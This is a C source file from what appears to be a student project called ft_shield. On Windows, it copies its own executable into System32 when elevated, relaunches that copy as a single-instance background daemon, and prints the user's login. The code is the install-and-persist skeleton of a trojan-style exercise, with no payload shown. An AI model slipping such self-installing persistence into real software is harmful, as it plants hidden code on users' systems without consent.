/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: zcadinot <zcadinot@student.42lehavre.      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/10/19 18:02:57 by zcadinot          #+#    #+#             */
/*   Updated: 2026/10/20 16:54:44 by zcadinot         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ft_shield.h"
#include <lmcons.h>
#include <stdio.h>

int mode_daemon()
{
    HANDLE mutex = CreateMutexW(NULL, FALSE, L"Local\\MonApplicationMutex");

    if (mutex == NULL)
    {
        printf("Erreur mutex : %lu\n", (unsigned long)GetLastError());
        CloseHandle(mutex);
        return (1);
    }

    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        printf("Already running...\n");
        CloseHandle(mutex);
        return (0);
    }
    CloseHandle(mutex);
    while (1)
    {
        continue;
    }
    return (1);
}

int mode_normal()
{
    if (!is_elevated())
        return (0);

    char login[UNLEN + 1];
    DWORD size = sizeof(login);
    char *mpath;

    if (!GetUserNameA(login, &size))
    {
        printf("Erreur : %lu\n", (unsigned long)GetLastError());
        return (0);
    }

    if ((mpath = get_my_path()) == NULL)
    {
        printf("Erreur : %lu\n", (unsigned long)GetLastError());
        return (0);
    }

    const char *dst = "C:\\Windows\\System32\\ft_shield.exe";


    if (!CopyFileA(mpath, dst, TRUE) && GetLastError() != ERROR_FILE_EXISTS)
    {
        printf("Erreur : %lu\n", (unsigned long)GetLastError());
        return (1);
    }

    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    WCHAR command_line[] =
        L"\"C:\\Windows\\System32\\ft_shield.exe\" --daemon";

    si.cb = sizeof(si);
    if (!CreateProcessW(L"C:\\Windows\\System32\\ft_shield.exe", command_line, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
    {
        printf("CreateProcessW erreur : %lu\n",
            (unsigned long)GetLastError());
        return (1);
    }
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    printf("%s\n", login);

    while (1)
    {
        continue;
    }
    return (1);
}

int main(int argc, char **argv)
{
    if (argc == 2 && strcmp(argv[1], "--daemon") == 0)
        return (mode_daemon());

    return (mode_normal());
}
